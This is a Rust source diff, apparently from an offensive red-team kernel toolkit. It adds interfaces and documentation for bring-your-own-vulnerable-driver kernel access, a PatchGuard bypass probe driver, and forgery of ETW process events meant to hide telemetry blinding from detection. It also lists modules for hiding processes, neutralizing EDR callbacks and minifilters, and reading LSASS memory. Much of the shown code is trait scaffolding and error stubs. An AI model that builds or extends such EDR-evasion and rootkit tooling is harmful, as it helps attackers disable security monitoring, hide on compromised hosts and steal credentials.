@@ -26,7 +26,7 @@
 //!   `EtwThreatIntProvRegHandle → GUID entry → EnableInfo → IsEnabled=0`).
 //!   Version-forked by UBR (RTM 0x050 vs patched 0x060); HVCI-safe data write.
 //! - `byovd::ByovdDriver` — BYOVD `KernelRw` over a driver IOCTL channel
-//!   (`RtCore64` CVE-2019-16098 reference) + pure ntoskrnl export resolver.
+//!   (Shield default / WDTKernel phys mode) + pure ntoskrnl export resolver.
 //! - `telemetry::CallbackNeutralizer` — Ps*NotifyRoutine ret-stub overwrite.
 //! - `telemetry::MiniFilterUnlinker` — fltmgr RegisteredFilters LIST_ENTRY unlink.
 //! - `persistence::ProcessHider` — ActiveProcessLinks unlink (DKOM).
@@ -36,12 +36,19 @@
 //!   by `win::select_pg_window_with_probe` in priority order: Peekaboo
 //!   (offset-free, needs a kernel callback seam — preferred) > RuntimePgBypass
 //!   (Win11 24H2+, flag-suspension) > TimingRepair (timing-based).
+//!   The production Peekaboo seam exists: `win::peekaboo::load_probe` loads the
+//!   signed probe driver (`tools/peekaboo-probe/`) via the `driver_load`
+//!   machinery and handshakes a real `PeekabooProbe` impl, so tier 1 is
+//!   reachable on a target once that driver is built + signed.
 //!   ⚠ EXPERIMENTAL (kernelsdk-1-1): the PG-context table rows are PLACEHOLDER
 //!   offsets (0x190/0x08, never PDB-verified) — the two PG-context windows
 //!   gate on `PgContextOffsets::verified` and are unreachable until per-build
 //!   validation lands. Peekaboo consumes only PDB-resolved EPROCESS offsets,
-//!   so it is NOT blocked by that gate; the capability is OFF only where no
-//!   `PeekabooProbe` seam is supplied rather than silently wrong.
+//!   so it is NOT blocked by that gate.
+//! - `etw_deception::EtwDeceiver` — ETW event forgery (structurally identical
+//!   synthetic events behind the [`EtwForgeKit`] seam). Assembled into
+//!   `KernelTier::etw_forge` by `win::assemble_tier`; the `NtTraceEvent`
+//!   injection itself is operator-wired.
 //! - `netsec::UserModeEdrSilencer` — WFP block-rule templates (FFI operator-side).
 //! - `netsec::KernelLsassReader` — DTB read + page-walk orchestration shell.
 //! - `netsec::EdrNeutralizer` — Kill/Freeze/Choke tiers (framework).
@@ -64,11 +71,16 @@ use alloc::vec::Vec;
 use core::fmt;
 
 /// BYOVD `KernelRw` bootstrap (P2.2 §1) — CODE SHIPPED, NOT LOADED. The driver
-/// IOCTL binding (`ByovdDriver` + `VulnDriverIoctl` + `RtCore64` reference) +
+/// IOCTL binding (`ByovdDriver` + `VulnDriverIoctl` + Shield/WDTKernel pack) +
 /// ntoskrnl symbol resolution are real and unit-tested; the driver LOAD step
 /// is operator-side and never runs on this host.
 pub mod byovd;
 pub mod byovd_drivers;
+/// System-process CR3 discovery via physical-memory scan (System EPROCESS
+/// needle + alignment/PID gates + MZ-validated page walk) — pure algorithm,
+/// host-testable. The WDTKernel phys-mode bootstrap (`win::wdt`) drives it
+/// with a live `\\.\__WDT__` handle.
+pub mod cr3_scan;
 /// CFG bitmap manipulation — mark NtContinue as valid call target via kernel r/w.
 /// Used to enable Ekko/Foliage sleep obfuscation on CFG-enabled processes
 /// where CreateTimerQueueTimer callbacks are blocked by Control Flow Guard.
@@ -127,6 +139,16 @@ pub mod win;
 #[cfg(not(target_os = "windows"))]
 #[path = "win/ksld.rs"]
 pub mod ksld;
+/// PeekabooProbe production seam — protocol constants + pure pack/parse layer
+/// + the transport-generic [`peekaboo::PeekabooProbeClient`] (a real
+/// [`persistence::PeekabooProbe`] impl over the `\\.\PeekabooProbe` IOCTL
+/// contract of `tools/peekaboo-probe`). Written cross-platform like `ksld`:
+/// only the CreateFileW/DeviceIoControl transport + the driver_load-based
+/// loader are cfg(windows); on non-Windows hosts the client runs against any
+/// [`peekaboo::PeekabooTransport`] (host-tested + scenario-tested).
+#[cfg(not(target_os = "windows"))]
+#[path = "win/peekaboo.rs"]
+pub mod peekaboo;
 /// Red-team operation-chain scenario tests (wave-2): chains the per-kit mocks
 /// into end-to-end engagement flows (EDR suppression / credentials / PG
 /// window) against one shared fake kernel image.
@@ -330,6 +352,38 @@ pub trait EtwTiKit {
     fn is_blinded(&self, krw: &dyn KernelRw) -> Result<bool, KitError>;
 }
 
+/// §2.1b — ETW deception (event forgery, Bypass Complete Phase 4). Builds
+/// synthetic ETW event buffers structurally identical to real
+/// kernel-provider events, so the *absence* of telemetry while the ETW-TI
+/// blind is active doesn't trip frequency/content-based detection.
+///
+/// Honest capability statement: buffer construction is PURE user-mode (no
+/// kernel primitive, no offsets) — that is what this trait covers and why the
+/// tier can always assemble it. The actual injection (`NtTraceEvent` with a
+/// live session handle) is operator-wired per engagement and is NOT part of
+/// this contract; forged events also lack the kernel's HMAC signature
+/// (defeats frequency/content checks, not cryptographic session validation —
+/// see `etw_deception` module docs).
+pub trait EtwForgeKit {
+    /// Forge a Process Start (Event ID 1) buffer for
+    /// `Microsoft-Windows-Kernel-Process`. `image_name` is UTF-16LE bytes
+    /// (the forged event embeds a UNICODE_STRING).
+    fn forge_process_create(
+        &self,
+        parent_pid: u32,
+        child_pid: u32,
+        image_name: &[u8],
+        timestamp: u64,
+    ) -> Result<Vec<u8>, KitError>;
+    /// Forge a Process Stop (Event ID 2) buffer.
+    fn forge_process_stop(
+        &self,
+        pid: u32,
+        exit_status: u32,
+        timestamp: u64,
+    ) -> Result<Vec<u8>, KitError>;
+}
+
 /// §2.2 — Ps/Ob/Cm kernel callbacks. Overwrite with a KCFG-compliant `ret`-only
 /// stub (NEVER null — PatchGuard bugchecks on null callback entries). The
 /// "repurpose" variant redirects to an attacker routine instead of a ret-stub.
@@ -527,6 +581,25 @@ impl CallbackKit for NoKernel {
         Err(KitError::UnsupportedPosture("NoKernel floor"))
     }
 }
+impl EtwForgeKit for NoKernel {
+    fn forge_process_create(
+        &self,
+        _parent_pid: u32,
+        _child_pid: u32,
+        _image_name: &[u8],
+        _timestamp: u64,
+    ) -> Result<Vec<u8>, KitError> {
+        Err(KitError::UnsupportedPosture("NoKernel floor"))
+    }
+    fn forge_process_stop(
+        &self,
+        _pid: u32,
+        _exit_status: u32,
+        _timestamp: u64,
+    ) -> Result<Vec<u8>, KitError> {
+        Err(KitError::UnsupportedPosture("NoKernel floor"))
+    }
+}
 impl MiniFilterKit for NoKernel {
     fn detach_edr(&self, _krw: &dyn KernelRw) -> Result<(), KitError> {
         Err(KitError::UnsupportedPosture("NoKernel floor"))
@@ -599,6 +672,12 @@ pub trait DriverHandle: Send + Sync {
 pub struct KernelTier {
     pub rw: Box<dyn KernelRw>,
     pub etw_ti: Option<Box<dyn EtwTiKit>>,
+    /// ETW deception (event forgery). Buffer forging is pure user-mode, so the
+    /// real tier always assembles this (`EtwDeceiver::with_kernel_defaults`);
+    /// honest capability = buffer construction ONLY — injection via
+    /// `NtTraceEvent` is operator-wired (see [`EtwForgeKit`]). `None` on the
+    /// floor tier.
+    pub etw_forge: Option<Box<dyn EtwForgeKit>>,
     pub callbacks: Option<Box<dyn CallbackKit>>,
     pub minifilter: Option<Box<dyn MiniFilterKit>>,
     pub wfp: Option<Box<dyn WfpKit>>,
@@ -622,6 +701,7 @@ impl KernelTier {
         Self {
             rw: Box::new(NoKernel),
             etw_ti: None,
+            etw_forge: None,
             callbacks: None,
             minifilter: None,
             wfp: None,
